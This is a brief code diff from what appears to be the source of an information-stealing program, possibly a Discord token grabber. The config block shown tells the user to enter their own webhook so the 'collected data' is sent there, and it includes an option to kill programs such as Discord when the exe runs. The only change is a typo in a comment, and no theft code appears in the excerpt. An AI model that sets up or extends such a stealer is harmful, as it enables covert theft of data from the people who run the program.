@@ -38,7 +38,7 @@ except:
     sys.exit
 
 config = {
-    # Replace WEBHOOK_URL with your own webhook. The collected data will be sent to this webhook. 
+    # Replace WEBH00K_URL with your own webhook. The collected data will be sent to this webhook. 
     'webhook': "WEBHOOK_URL",
     
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
